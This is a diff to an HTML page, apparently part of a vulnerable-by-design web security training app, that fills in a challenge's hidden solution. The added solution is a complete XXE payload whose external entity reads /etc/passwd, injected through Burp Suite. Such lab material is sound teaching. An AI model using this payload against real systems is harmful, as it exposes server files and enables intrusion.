@@ -265,8 +265,11 @@ fieldset label.infield /* .infield label added by JS */ {
 							<li><H5 style="cursor: pointer" onclick="toggleBlock(this, 'solution');"> Solution </H5>
 							<DIV id="solution" style="display:none">
 							<P>
-							Intercept the request in Burp Suite and modify the XML data to add DOCTYPE header
-
+							Intercept the request in Burp Suite and modify the XML data to add DOCTYPE header:
+ 							"&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+							&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+							&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+							&lt;root&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;password@123&lt;/password&gt;&lt;/root&gt;"
 							</P>
 							</DIV>
 						   </li>
